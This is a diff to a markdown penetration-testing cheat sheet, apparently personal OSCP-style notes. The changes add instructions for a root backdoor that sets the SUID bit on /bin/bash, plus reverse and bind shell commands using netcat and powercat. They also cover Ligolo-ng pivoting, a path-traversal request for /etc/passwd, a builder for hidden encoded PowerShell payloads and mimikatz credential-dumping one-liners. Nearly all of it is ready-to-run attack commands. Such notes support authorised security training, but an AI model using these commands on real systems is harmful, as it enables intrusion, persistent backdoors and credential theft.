@@ -1,6 +1,7 @@
-# Decode BASE64
+# BASE64
 
-## Powershell
+## Decode
+### Powershell
 
 ```powershell
 PS > [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmxhaGJsYWg="))
@@ -13,13 +14,13 @@ PS >[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("
 blahblah
 ```
 
-## Bash
+### Bash
 
 ```bash
-echo 
+echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode
 ```
 
-## Python
+### Python
 
 ```python
 import sys
@@ -32,11 +33,10 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 print(cmd)
 ```
 
-# Curl
-```bash
-curl -path-as-is http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-```
-# Using PowerShell to BASE64 Encode
+## Encode
+
+### Powershell
+
 ```powershell
 pwsh # if using Kali
 
@@ -49,6 +49,119 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
 
 exit # if using Kali
+```
+
+# Backdoor Crafting
+
+Leaving a backdoor in a system can easily let us come back later and gain immediatly control over the machine. The simplest "root" backdoor on Linux can be done with bash. Just using
+
+```shell
+sudo chmod +s /bin/bash
+```
+
+Will set the SUID over the bash binary. That means that using
+
+```shell
+/bin/bash -p
+```
+
+A **root** shell will be gained. The "-p" option preserve the SUID bit. In this way the bash program is called with the owner privileges (root) and if It is not called with "-p" It remains a normal bash shell. Many programs like linpeas.sh or some privesc checker will anyway find this backdoor and report it.
+
+# Reverse Shell VS Bind Shell
+
+What use and when? Typically we use the bind shell in two scenarios. The first is the one in which we already have the access to the machine and we want a persistent access or a backdoor on it. In order to do that we could set a service that binds that port at every boot of the machine. The second scenario is the one in which we are not in the same internal network of the machine and we can't reach our machine from the victim because, for example, we are reaching the victim through web access and to obtain a reverse shell we likely have to enable port forwarding on the router of our networking. In this scenario a bind shell could let the attacker connect to the victim knowing only the external IP of the victim.
+
+## Reverse Shell
+
+Receiving a command line access to a remote machine, where the victim establish the connection to the attacker machine that is the listener.
+
+Once the reverse shell payload is executed on the victim machine, on the attacker the listener will be
+
+```shell
+nc -lvnp 4444 -e /bin/bash
+```
+
+## Bind Shell
+
+Receiving a command line access to a remote machine, where the victim establish the connection to the victim machine that is the listener.
+
+Once the foothold is gained on the victim machine, It can be set up a listener that opens a shell at every connection. After the following connection is made, we can obtain a shell access on the victim machine. This command is run from the attacker.
+
+```shell
+nc <REMOTE-IP> 4444
+```
+
+# Shell Stabilization
+
+Once we gain a shell, many times we don't have a fully interactive environment. We can use many tools to stabilize it.
+
+## Netcat
+
+From the kali machine we run the listener
+
+```shell
+nc -lvp <PORT>
+```
+
+From the Windows machine
+
+```powershell
+.\nc.exe <IP> <PORT> -e powershell
+```
+
+If we have a Linux machine
+
+```powershell
+.\nc.exe <IP> <PORT> -e bash
+```
+
+## Python3
+
+Checking if the terminal is tty, otherwise spawn a tty with python3
+
+```shell
+tty
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Powercat
+
+We can use Powercat to serve the shell on the listener
+
+```shell
+nc -lvp <PORT>
+```
+
+```powershell
+powercat -l -p <PORT> -e cmd
+```
+
+# Ligolo-ng
+
+```powershell
+#Creating interface and starting it.
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+#Kali machine - Attacker machine
+./proxy -laddr 0.0.0.0:9001 -selfcert
+
+#windows or linux machine - compromised machine
+agent.exe -connect <LHOST>:9001 -ignore-cert
+
+#In Ligolo-ng console
+session #select host
+ifconfig #Notedown the internal network's subnet
+start #after adding relevent subnet to ligolo interface
+
+#Adding subnet to ligolo interface - Kali linux
+sudo ip r add <subnet> dev ligolo
+```
+
+# Curl
+
+```bash
+curl -path-as-is http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 # Important Locations
 
@@ -588,26 +701,4 @@ lsadump::lsa /patch #both these dump SAM
 #OneLiner
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
-```
-
-# Ligolo-ng
-
-```powershell
-#Creating interface and starting it.
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-
-#Kali machine - Attacker machine
-./proxy -laddr 0.0.0.0:9001 -selfcert
-
-#windows or linux machine - compromised machine
-agent.exe -connect <LHOST>:9001 -ignore-cert
-
-#In Ligolo-ng console
-session #select host
-ifconfig #Notedown the internal network's subnet
-start #after adding relevent subnet to ligolo interface
-
-#Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
 ```
